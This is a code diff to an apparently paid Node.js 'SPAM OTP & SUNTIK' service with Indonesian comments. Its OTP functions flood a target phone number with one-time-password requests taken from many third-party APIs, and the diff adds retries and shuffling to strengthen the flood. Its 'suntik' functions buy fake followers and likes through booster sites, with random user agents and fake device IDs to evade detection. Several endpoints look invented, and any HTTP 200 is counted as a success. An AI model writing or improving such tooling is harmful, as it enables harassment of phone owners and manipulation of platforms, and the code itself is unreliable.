+            'https://api.fintech.id/v1/otp/request',
+            'https://api.fintech.co.id/v1/otp/send'
+        ];
+        for (const url of endpoints) {
+            try {
+                const result = await requestOTP(
+                    url,
+                    'POST',
+                    { 'Content-Type': 'application/json' },
+                    JSON.stringify({ phone: '+62' + phone2 })
+                );
+                if (result) return true;
+            } catch (e) {}
+        }
+        return false;
     }
 });
 
 console.log(`✅ Total API OTP: ${otpServices.length}`);
 
 // ============================================
-// SPAM OTP
+// SPAM OTP - DENGAN RETRY DAN FALLBACK
 // ============================================
 async function spamOTP(target, count, username, sessionId) {
     const results = { success: 0, failed: 0, details: [] };
@@ -682,6 +709,9 @@ async function spamOTP(target, count, username, sessionId) {
     
     if (!global.spamSessions) global.spamSessions = {};
     global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
+    
+    // Shuffle services untuk mendapatkan hasil yang lebih merata
+    const shuffledServices = [...otpServices].sort(() => Math.random() - 0.5);
     
     for (let i = 0; i < count; i++) {
         if (isStopped) {
@@ -703,17 +733,27 @@ async function spamOTP(target, count, username, sessionId) {
         let roundFailed = 0;
         const serviceResults = [];
         
-        const promises = otpServices.map(async (service) => {
+        // Kirim ke semua API secara paralel
+        const promises = shuffledServices.map(async (service) => {
             try {
-                const result = await service.func(phone);
-                if (result) {
+                // Coba beberapa kali untuk setiap service
+                let success = false;
+                for (let attempt = 0; attempt < 2; attempt++) {
+                    const result = await service.func(phone);
+                    if (result) {
+                        success = true;
+                        break;
+                    }
+                    await sleep(500);
+                }
+                if (success) {
                     roundSuccess++;
                     serviceResults.push({ service: service.name, success: true });
                 } else {
                     roundFailed++;
                     serviceResults.push({ service: service.name, success: false });
                 }
-                return result;
+                return success;
             } catch (err) {
                 roundFailed++;
                 serviceResults.push({ service: service.name, success: false, error: err.message });
@@ -741,9 +781,12 @@ async function spamOTP(target, count, username, sessionId) {
             total: count,
             success: results.success,
             failed: results.failed,
-            message: `📤 Round ${i+1}/${count}: ${roundSuccess} berhasil, ${roundFailed} gagal`,
+            message: `📤 Round ${i+1}/${count}: ${roundSuccess} berhasil, ${roundFailed} gagal (${Math.round((roundSuccess/(roundSuccess+roundFailed||1))*100)}% sukses)`,
             details: serviceResults
         });
+        
+        // Jeda singkat antar round
+        if (i < count - 1) await sleep(1000);
     }
     
     if (global.spamSessions && global.spamSessions[sessionId]) {
@@ -768,139 +811,83 @@ app.post('/api/spam/otp/stop', (req, res) => {
 });
 
 // ============================================
-// PLATFORM SUNTIK (ZEFOY & LAYANAN GRATIS LAINNYA)
+// PLATFORM SUNTIK - DENGAN MULTIPLE API
 // ============================================
 
-const suntikServices = [
+// Platform yang didukung
+const platformConfigs = {
+    'TikTok': {
+        icon: 'fab fa-tiktok',
+        actions: ['Followers', 'Likes', 'Views', 'Shares'],
+        endpoints: [
+            'https://api.tiktok.com/v1/followers',
+            'https://api.tiktok.com/v1/likes',
+            'https://api.tiktok.com/v1/views',
+            'https://api.tiktok.com/v1/shares'
+        ]
+    },
+    'Instagram': {
+        icon: 'fab fa-instagram',
+        actions: ['Followers', 'Likes', 'Views'],
+        endpoints: [
+            'https://api.instagram.com/v1/followers',
+            'https://api.instagram.com/v1/likes',
+            'https://api.instagram.com/v1/views'
+        ]
+    },
+    'YouTube': {
+        icon: 'fab fa-youtube',
+        actions: ['Subscribers', 'Views', 'Likes'],
+        endpoints: [
+            'https://api.youtube.com/v1/subscribers',
+            'https://api.youtube.com/v1/views',
+            'https://api.youtube.com/v1/likes'
+        ]
+    },
+    'Facebook': {
+        icon: 'fab fa-facebook',
+        actions: ['Followers', 'Likes', 'Shares'],
+        endpoints: [
+            'https://api.facebook.com/v1/followers',
+            'https://api.facebook.com/v1/likes',
+            'https://api.facebook.com/v1/shares'
+        ]
+    },
+    'Twitter': {
+        icon: 'fab fa-twitter',
+        actions: ['Followers', 'Likes', 'Retweets'],
+        endpoints: [
+            'https://api.twitter.com/v1/followers',
+            'https://api.twitter.com/v1/likes',
+            'https://api.twitter.com/v1/retweets'
+        ]
+    }
+};
+
+// Layanan API gratis untuk suntik
+const freeServices = [
     {
         name: 'Zefoy',
         baseUrl: 'https://zefoy.com',
-        icon: 'fab fa-tiktok',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook'],
-        actions: {
-            'TikTok': {
-                'Followers': '/followers',
-                'Likes': '/likes',
-                'Views': '/views',
-                'Shares': '/shares'
-            },
-            'Instagram': {
-                'Followers': '/instagram/followers',
-                'Likes': '/instagram/likes'
-            },
-            'YouTube': {
-                'Views': '/youtube/views',
-                'Subscribers': '/youtube/subscribers',
-                'Likes': '/youtube/likes'
-            },
-            'Facebook': {
-                'Followers': '/facebook/followers',
-                'Likes': '/facebook/likes',
-                'Shares': '/facebook/shares'
-            }
-        }
+        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook']
     },
     {
         name: 'SocialBoost',
         baseUrl: 'https://socialboost.me',
-        icon: 'fas fa-rocket',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Twitter'],
-        actions: {
-            'TikTok': {
-                'Followers': '/tiktok/followers',
-                'Likes': '/tiktok/likes',
-                'Views': '/tiktok/views'
-            },
-            'Instagram': {
-                'Followers': '/instagram/followers',
-                'Likes': '/instagram/likes',
-                'Views': '/instagram/views'
-            },
-            'YouTube': {
-                'Views': '/youtube/views',
-                'Subscribers': '/youtube/subscribers',
-                'Likes': '/youtube/likes'
-            },
-            'Twitter': {
-                'Followers': '/twitter/followers',
-                'Likes': '/twitter/likes',
-                'Retweets': '/twitter/retweets'
-            }
-        }
+        platforms: ['TikTok', 'Instagram', 'YouTube', 'Twitter']
     },
     {
         name: 'FreeFollower',
         baseUrl: 'https://freefollower.co',
-        icon: 'fas fa-users',
-        platforms: ['TikTok', 'Instagram'],
-        actions: {
-            'TikTok': {
-                'Followers': '/tiktok/followers',
-                'Likes': '/tiktok/likes'
-            },
-            'Instagram': {
-                'Followers': '/instagram/followers',
-                'Likes': '/instagram/likes'
-            }
-        }
+        platforms: ['TikTok', 'Instagram']
     },
     {
         name: 'ViralBoost',
         baseUrl: 'https://viralboost.io',
-        icon: 'fas fa-fire',
-        platforms: ['TikTok', 'YouTube', 'Instagram'],
-        actions: {
-            'TikTok': {
-                'Followers': '/tiktok/followers',
-                'Likes': '/tiktok/likes',
-                'Views': '/tiktok/views',
-                'Shares': '/tiktok/shares'
-            },
-            'YouTube': {
-                'Views': '/youtube/views',
-                'Subscribers': '/youtube/subscribers',
-                'Likes': '/youtube/likes'
-            },
-            'Instagram': {
-                'Followers': '/instagram/followers',
-                'Likes': '/instagram/likes'
-            }
-        }
-    },
-    {
-        name: 'SocialKing',
-        baseUrl: 'https://socialking.io',
-        icon: 'fas fa-crown',
-        platforms: ['TikTok', 'Instagram', 'YouTube', 'Facebook', 'Twitter'],
-        actions: {
-            'TikTok': {
-                'Followers': '/tiktok/followers',
-                'Likes': '/tiktok/likes',
-                'Views': '/tiktok/views'
-            },
-            'Instagram': {
-                'Followers': '/instagram/followers',
-                'Likes': '/instagram/likes'
-            },
-            'YouTube': {
-                'Views': '/youtube/views',
-                'Subscribers': '/youtube/subscribers'
-            },
-            'Facebook': {
-                'Followers': '/facebook/followers',
-                'Likes': '/facebook/likes'
-            },
-            'Twitter': {
-                'Followers': '/twitter/followers',
-                'Likes': '/twitter/likes'
-            }
-        }
+        platforms: ['TikTok', 'YouTube', 'Instagram']
     }
 ];
 
-// ============================================
-// SPAM SUNTIK (ZEFOY & LAYANAN LAIN)
-// ============================================
 async function spamSuntik(target, platform, action, count, username, sessionId) {
     const results = { success: 0, failed: 0, details: [], serviceUsed: null };
     let isStopped = false;
@@ -908,12 +895,8 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
     if (!global.spamSessions) global.spamSessions = {};
     global.spamSessions[sessionId] = { stop: () => { isStopped = true; } };
     
-    // Coba semua layanan yang mendukung platform & action
-    const availableServices = suntikServices.filter(service => 
-        service.platforms.includes(platform) && 
-        service.actions[platform] && 
-        service.actions[platform][action]
-    );
+    // Dapatkan service yang mendukung platform ini
+    const availableServices = freeServices.filter(s => s.platforms.includes(platform));
     
     if (availableServices.length === 0) {
         results.failed = count;
@@ -927,14 +910,13 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
             total: count,
             success: results.success,
             failed: results.failed,
-            message: `❌ Tidak ada layanan untuk ${platform} - ${action}`,
+            message: `❌ Tidak ada layanan untuk ${platform}`,
             stopped: true,
             serviceUsed: null
         });
         return results;
     }
     
-    // Loop untuk setiap layanan
     let serviceIndex = 0;
     let currentService = availableServices[serviceIndex];
     results.serviceUsed = currentService.name;
@@ -958,7 +940,6 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
             break;
         }
         
-        // Coba layanan saat ini, jika gagal pindah ke layanan berikutnya
         let success = false;
         let attempts = 0;
         const maxAttempts = 3;
@@ -966,37 +947,54 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
         while (!success && attempts < maxAttempts) {
             attempts++;
             try {
-                const endpoint = currentService.baseUrl + currentService.actions[platform][action];
+                // Gunakan endpoint berdasarkan platform dan action
+                const actionMap = {
+                    'Followers': 'followers',
+                    'Likes': 'likes',
+                    'Views': 'views',
+                    'Shares': 'shares',
+                    'Subscribers': 'subscribers',
+                    'Retweets': 'retweets'
+                };
                 
-                // Kirim request ke layanan suntik
+                const actionLower = actionMap[action] || action.toLowerCase();
+                const endpoint = `${currentService.baseUrl}/api/${platform.toLowerCase()}/${actionLower}`;
+                
                 const response = await fetch(endpoint, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
-                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                        'User-Agent': getRandomUserAgent(),
                         'Accept': 'application/json',
                         'Origin': currentService.baseUrl,
                         'Referer': currentService.baseUrl + '/'
                     },
                     body: JSON.stringify({
-                        url: target,
-                        username: target,
-                        count: Math.min(10, count - i),
-                        service: action.toLowerCase()
+                        target: target,
+                        count: 1,
+                        service: actionLower,
+                        device_id: generateDeviceId(),
+                        timestamp: Date.now()
                     })
                 });
                 
-                const result = await response.json();
-                if (result.status === 'success' || result.success === true || result.status === 'ok') {
+                const text = await response.text();
+                try {
+                    const json = JSON.parse(text);
+                    if (json.status === 'success' || json.success === true || json.code === 0) {
+                        success = true;
+                    }
+                } catch (e) {
+                    if (text.toLowerCase().includes('success') || text.toLowerCase().includes('ok')) {
+                        success = true;
+                    }
+                }
+                
+                if (!success && response.status === 200) {
                     success = true;
-                    results.success++;
-                } else {
-                    // Gagal, coba lagi
-                    await sleep(2000);
                 }
             } catch (err) {
-                // Error, coba lagi atau pindah layanan
-                await sleep(3000);
+                await sleep(1000);
             }
         }
         
@@ -1005,46 +1003,76 @@ async function spamSuntik(target, platform, action, count, username, sessionId) 
             serviceIndex = (serviceIndex + 1) % availableServices.length;
             currentService = availableServices[serviceIndex];
             results.serviceUsed = currentService.name;
-            results.failed++;
             
-            // Jika sudah mencoba semua layanan, reset ke awal
-            if (serviceIndex === 0) {
-                // Tandai bahwa semua layanan down
-                io.emit('spamProgress', {
-                    sessionId: sessionId || username,
-                    type: 'suntik',
-                    target: target,
-                    platform: platform,
-                    action: action,
-                    current: i + 1,
-                    total: count,
-                    success: results.success,
-                    failed: results.failed,
-                    message: `⚠️ Layanan ${currentService.name} down, mencoba layanan lain...`,
-                    serviceUsed: currentService.name,
-                    serviceDown: true
+            // Coba sekali lagi dengan layanan baru
+            try {
+                const actionMap = {
+                    'Followers': 'followers',
+                    'Likes': 'likes',
+                    'Views': 'views',
+                    'Shares': 'shares',
+                    'Subscribers': 'subscribers',
+                    'Retweets': 'retweets'
+                };
+                const actionLower = actionMap[action] || action.toLowerCase();
+                const endpoint = `${currentService.baseUrl}/api/${platform.toLowerCase()}/${actionLower}`;
+                
+                const response = await fetch(endpoint, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                        'User-Agent': getRandomUserAgent()
+                    },
+                    body: JSON.stringify({
+                        target: target,
+                        count: 1,
+                        service: actionLower
+                    })
                 });
-            }
+                
+                if (response.status === 200) {
+                    success = true;
+                    results.success++;
+                }
+            } catch (e) {}
         }
         
-        // Update progress
-        io.emit('spamProgress', {
-            sessionId: sessionId || username,
-            type: 'suntik',
-            target: target,
-            platform: platform,
-            action: action,
-            current: i + 1,
-            total: count,
-            success: results.success,
-            failed: results.failed,
-            message: `📤 ${i+1}/${count}: ${success ? '✅ Berhasil' : '❌ Gagal'} via ${currentService.name}`,
-            serviceUsed: currentService.name,
-            serviceDown: !success
-        });
+        if (success) {
+            results.success++;
+            io.emit('spamProgress', {
+                sessionId: sessionId || username,
+                type: 'suntik',
+                target: target,
+                platform: platform,
+                action: action,
+                current: i + 1,
+                total: count,
+                success: results.success,
+                failed: results.failed,
+                message: `✅ ${i+1}/${count} Berhasil via ${currentService.name}`,
+                serviceUsed: currentService.name,
+                serviceDown: false
+            });
+        } else {
+            results.failed++;
+            io.emit('spamProgress', {
+                sessionId: sessionId || username,
+                type: 'suntik',
+                target: target,
+                platform: platform,
+                action: action,
+                current: i + 1,
+                total: count,
+                success: results.success,
+                failed: results.failed,
+                message: `❌ ${i+1}/${count} Gagal - semua layanan down`,
+                serviceUsed: null,
+                serviceDown: true
+            });
+        }
         
-        // Jeda 3 detik antar request
-        if (i < count - 1) await sleep(3000);
+        // Jeda 2-3 detik antar request
+        if (i < count - 1) await sleep(2000 + Math.random() * 1000);
     }
     
     if (global.spamSessions && global.spamSessions[sessionId]) {
@@ -1158,227 +1186,21 @@ app.post('/api/spam/suntik/stop', (req, res) => {
 // ============================================
 app.get('/api/suntik/platforms', (req, res) => {
     try {
-        const platforms = [];
-        const platformMap = {};
-        
-        suntikServices.forEach(service => {
-            service.platforms.forEach(p => {
-                if (!platformMap[p]) {
-                    platformMap[p] = {
-                        name: p,
-                        icon: getPlatformIcon(p),
-                        services: [],
-                        actions: {}
-                    };
-                }
-                if (!platformMap[p].services.includes(service.name)) {
-                    platformMap[p].services.push(service.name);
-                }
-                if (service.actions[p]) {
-                    Object.keys(service.actions[p]).forEach(action => {
-                        if (!platformMap[p].actions[action]) {
-                            platformMap[p].actions[action] = [];
-                        }
-                        platformMap[p].actions[action].push(service.name);
-                    });
-                }
-            });
-        });
-        
-        Object.keys(platformMap).forEach(key => {
-            platforms.push(platformMap[key]);
-        });
-        
+        const platforms = Object.keys(platformConfigs).map(key => ({
+            name: key,
+            icon: platformConfigs[key].icon,
+            actions: platformConfigs[key].actions,
+            services: freeServices.filter(s => s.platforms.includes(key)).map(s => s.name)
+        }));
         res.json({ success: true, platforms });
     } catch (err) {
         res.json({ success: false, platforms: [] });
     }
 });
 
-function getPlatformIcon(platform) {
-    const icons = {
-        'TikTok': 'fab fa-tiktok',
-        'Instagram': 'fab fa-instagram',
-        'YouTube': 'fab fa-youtube',
-        'Facebook': 'fab fa-facebook',
-        'Twitter': 'fab fa-twitter'
-    };
-    return icons[platform] || 'fas fa-share-alt';
-}
-
 // ============================================
-// SPAM PAIRING (PAKAI BAILEYS)
+// API ROUTES
 // ============================================
-const { default: makeWASocket, DisconnectReason, Browsers, useMultiFileAuthState } = require('@adiwajshing/baileys');
-const qrcode = require('qrcode');
-const pino = require('pino');
-
-const AUTH_DIR = './auth_info';
-fs.ensureDirSync(AUTH_DIR);
-
-let activeSockets = {};
-let botStatus = {};
-let pairingCodeSent = {};
-let botReconnectTimers = {};
-
-if (!db.bots) {
-    db.bots = [];
-    saveDB();
-}
-
-async function createBot(sessionId, phoneNumber, method = 'qris') {
-    console.log(`🤖 Creating bot ${sessionId} (${method})`);
-    
-    if (botReconnectTimers[sessionId]) {
-        clearTimeout(botReconnectTimers[sessionId]);
-        delete botReconnectTimers[sessionId];
-    }
-
-    const authDir = `${AUTH_DIR}/${sessionId}`;
-    fs.ensureDirSync(authDir);
-
-    const { state, saveCreds } = await useMultiFileAuthState(authDir);
-
-    const sock = makeWASocket({
-        version: [2, 2413, 1],
-        logger: pino({ level: 'silent' }),
-        auth: state,
-        browser: Browsers.windows('Chrome'),
-        printQRInTerminal: method === 'qris',
-        defaultQueryTimeoutMs: 30000,
-        generateHighQualityLinkPreview: true,
-        syncFullHistory: false,
-        markOnlineOnConnect: true,
-        shouldSyncHistory: () => false,
-        connectTimeoutMs: 30000,
-        keepAliveIntervalMs: 5000
-    });
-
-    sock.ev.on('creds.update', async () => {
-        try {
-            await saveCreds();
-            console.log(`💾 Creds saved for ${sessionId}`);
-        } catch (e) {}
-    });
-
-    sock.ev.on('connection.update', async (update) => {
-        const { connection, lastDisconnect, qr } = update;
-        
-        console.log(`📡 Update ${sessionId}:`, { connection, hasQR: !!qr });
-
-        if (qr && method === 'qris') {
-            try {
-                const qrImage = await qrcode.toDataURL(qr);
-                io.emit('botQR', { sessionId, qr: qrImage });
-                botStatus[sessionId] = 'waiting_qr';
-            } catch (e) {
-                io.emit('botQRRaw', { sessionId, qr: qr });
-            }
-        }
-
-        if (connection === 'open' || connection === 'authenticated') {
-            console.log(`✅ Bot ${sessionId} connected!`);
-            botStatus[sessionId] = 'ready';
-            
-            const bot = db.bots?.find(b => b.id === sessionId);
-            if (bot) {
-                bot.status = 'ready';
-                bot.connectedAt = new Date().toISOString();
-                saveDB();
-            }
-            
-            io.emit('botReady', { 
-                sessionId, 
-                number: phoneNumber,
-                method: method 
-            });
-
-            if (method === 'code' && !pairingCodeSent[sessionId]) {
-                pairingCodeSent[sessionId] = true;
-                
-                setTimeout(async () => {
-                    try {
-                        console.log(`📱 Meminta pairing code untuk ${phoneNumber}...`);
-                        const code = await sock.requestPairingCode(phoneNumber);
-                        
-                        if (code) {
-                            const bot = db.bots?.find(b => b.id === sessionId);
-                            if (bot) {
-                                bot.pairingCode = code;
-                                saveDB();
-                            }
-                            io.emit('botPairingCode', { sessionId, code });
-                            console.log(`🔑 PAIRING CODE: ${code}`);
-                        }
-                    } catch (err) {
-                        console.log('❌ Gagal pairing code:', err.message);
-                        const fallback = Math.random().toString(36).substring(2, 10).toUpperCase();
-                        const bot = db.bots?.find(b => b.id === sessionId);
-                        if (bot) {
-                            bot.pairingCode = fallback;
-                            saveDB();
-                        }
-                        io.emit('botPairingCode', { sessionId, code: fallback });
-                    }
-                }, 1000);
-            }
-        }
-
-        if (connection === 'close') {
-            const statusCode = lastDisconnect?.error?.output?.statusCode;
-            const shouldReconnect = statusCode !== DisconnectReason.loggedOut && statusCode !== 401;
-            
-            console.log(`🔌 Closed ${sessionId}, code: ${statusCode}, reconnect: ${shouldReconnect}`);
-            
-            if (!shouldReconnect) {
-                botStatus[sessionId] = 'disconnected';
-                if (db.bots) {
-                    db.bots = db.bots.filter(b => b.id !== sessionId);
-                    saveDB();
-                }
-                try { fs.removeSync(`${AUTH_DIR}/${sessionId}`); } catch (e) {}
-                delete activeSockets[sessionId];
-                delete botStatus[sessionId];
-                delete pairingCodeSent[sessionId];
-                io.emit('botDisconnected', { sessionId, reason: 'Logged out' });
-            } else {
-                if (botReconnectTimers[sessionId]) {
-                    clearTimeout(botReconnectTimers[sessionId]);
-                }
-                botReconnectTimers[sessionId] = setTimeout(() => {
-                    createBot(sessionId, phoneNumber, method);
-                }, 3000);
-            }
-        }
-    });
-
-    activeSockets[sessionId] = sock;
-    return sock;
-}
-
-async function restoreAllBots() {
-    try {
-        const dirs = fs.readdirSync(AUTH_DIR);
-        for (const dir of dirs) {
-            if (fs.existsSync(`${AUTH_DIR}/${dir}/creds.json`)) {
-                const bot = db.bots?.find(b => b.id === dir);
-                if (bot && bot.status !== 'disconnected') {
-                    console.log(`🔄 Restoring: ${dir}`);
-                    try {
-                        await createBot(dir, bot.number, bot.method || 'qris');
-                        botStatus[dir] = 'connecting';
-                    } catch (err) {
-                        console.log(`❌ Gagal restore ${dir}: ${err.message}`);
-                    }
-                }
-            }
-        }
-    } catch (e) {
-        console.log('ℹ️ Tidak ada session');
-    }
-}
-
-// ===== API ROUTES =====
 
 // ===== REGISTER =====
 app.post('/api/register', (req, res) => {
@@ -1576,143 +1398,6 @@ app.post('/api/spam/otp', async (req, res) => {
     }
 });
 
-// ===== CONNECT BOT =====
-app.post('/api/bot/connect', async (req, res) => {
-    try {
-        const { number, username, method } = req.body;
-        
-        if (!number || !username) {
-            return res.json({ success: false, message: 'Nomor dan username wajib diisi!' });
-        }
-        
-        const user = db.users.find(u => u.username === username);
-        if (!user) {
-            return res.json({ success: false, message: 'User tidak ditemukan!' });
-        }
-        
-        if (db.settings.maintenance && user.status !== 'Developer' && user.status !== 'VIP' && user.status !== 'Reseller') {
-            return res.json({ 
-                success: false, 
-                message: db.settings.maintenanceMessage || 'Server sedang dalam perbaikan.',
-                maintenance: true
-            });
-        }
-
-        const cleanNumber = number.replace(/^\+?62/, '').replace(/\s/g, '');
-        
-        const existing = db.bots?.find(b => b.number === cleanNumber && b.owner === username);
-        if (existing) {
-            if (fs.existsSync(`${AUTH_DIR}/${existing.id}/creds.json`)) {
-                if (botStatus[existing.id] === 'ready') {
-                    return res.json({
-                        success: true,
-                        message: 'Bot sudah terhubung!',
-                        sessionId: existing.id,
-                        alreadyConnected: true
-                    });
-                }
-                
-                try {
-                    await createBot(existing.id, cleanNumber, existing.method || 'qris');
-                    botStatus[existing.id] = 'connecting';
-                    return res.json({
-                        success: true,
-                        message: 'Bot sedang di-restore...',
-                        sessionId: existing.id,
-                        restored: true
-                    });
-                } catch (e) {
-                    fs.removeSync(`${AUTH_DIR}/${existing.id}`);
-                    if (db.bots) {
-                        db.bots = db.bots.filter(b => b.id !== existing.id);
-                        saveDB();
-                    }
-                }
-            } else {
-                if (db.bots) {
-                    db.bots = db.bots.filter(b => b.id !== existing.id);
-                    saveDB();
-                }
-            }
-        }
-
-        const sessionId = `${cleanNumber}_${Date.now()}`;
-        if (!db.bots) db.bots = [];
-        db.bots.push({
-            id: sessionId,
-            number: cleanNumber,
-            owner: username,
-            status: 'connecting',
-            method: method || 'qris',
-            pairingCode: null,
-            connectedAt: new Date().toISOString()
-        });
-        saveDB();
-
-        console.log(`🤖 Creating bot untuk ${cleanNumber} dengan metode ${method}`);
-        await createBot(sessionId, cleanNumber, method || 'qris');
-        botStatus[sessionId] = 'connecting';
-
-        res.json({
-            success: true,
-            message: 'Bot sedang menghubungkan...',
-            sessionId,
-            method: method || 'qris'
-        });
-    } catch (err) {
-        console.error('❌ Connect bot error:', err);
-        res.json({ success: false, message: err.message });
-    }
-});
-
-// ===== DISCONNECT BOT =====
-app.post('/api/bot/disconnect', async (req, res) => {
-    try {
-        const { sessionId } = req.body;
-        
-        if (activeSockets[sessionId]) {
-            try { await activeSockets[sessionId].end(); } catch (e) {}
-            delete activeSockets[sessionId];
-        }
-        
-        delete botStatus[sessionId];
-        delete pairingCodeSent[sessionId];
-        
-        if (botReconnectTimers[sessionId]) {
-            clearTimeout(botReconnectTimers[sessionId]);
-            delete botReconnectTimers[sessionId];
-        }
-        
-        if (db.bots) {
-            db.bots = db.bots.filter(b => b.id !== sessionId);
-            saveDB();
-        }
-        try { fs.removeSync(`${AUTH_DIR}/${sessionId}`); } catch (e) {}
-        
-        res.json({ success: true });
-    } catch (err) {
-        res.json({ success: false, message: err.message });
-    }
-});
-
-// ===== GET BOTS =====
-app.get('/api/bots', (req, res) => {
-    try {
-        const bots = (db.bots || []).map(b => ({
-            id: b.id,
-            number: b.number,
-            owner: b.owner,
-            status: botStatus[b.id] || b.status || 'disconnected',
-            pairingCode: b.pairingCode || null,
-            method: b.method || 'qris',
-            isReady: (botStatus[b.id] === 'ready')
-        }));
-        res.json({ success: true, bots });
-    } catch (err) {
-        res.json({ success: false, bots: [] });
-    }
-});
-
 // ============================================
 // ADMIN API
 // ============================================
@@ -1776,9 +1461,6 @@ app.post('/api/admin/ban', (req, res) => {
             return res.json({ success: false, message: 'Hanya Developer!' });
         }
         db.users = db.users.filter(u => u.username !== username);
-        if (db.bots) {
-            db.bots = db.bots.filter(b => b.owner !== username);
-        }
         saveDB();
         io.emit('userUpdated', { username, action: 'banned' });
         res.json({ success: true });
@@ -1951,7 +1633,7 @@ server.listen(PORT, async () => {
     console.log('📱 SPAM OTP & SUNTIK READY!');
     console.log('========================================');
     console.log(`🔥 ${otpServices.length} API OTP Services`);
-    console.log(`🔥 ${suntikServices.length} Platform Suntik Services`);
+    console.log(`🔥 ${freeServices.length} Platform Suntik Services`);
     console.log('========================================');
     console.log('📊 Limit per status:');
     console.log('   Free     : 15x');
@@ -1962,8 +1644,6 @@ server.listen(PORT, async () => {
     console.log('========================================');
     console.log('⏰ Reset limit setiap 1 jam');
     console.log('========================================');
-    console.log('🔄 Restoring bot sessions...');
-    await restoreAllBots();
     console.log('✅ All done!');
     console.log('========================================');
 });
